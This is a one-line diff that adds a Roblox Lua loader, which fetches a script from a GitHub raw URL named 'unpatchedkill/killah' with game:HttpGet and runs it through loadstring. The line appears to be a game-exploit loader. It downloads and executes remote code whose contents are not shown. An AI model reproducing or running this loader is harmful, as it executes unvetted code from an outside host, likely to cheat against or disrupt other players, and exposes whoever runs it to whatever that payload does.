@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/sederyttv-scripter/unpatchedkill/refs/heads/main/killah"))()
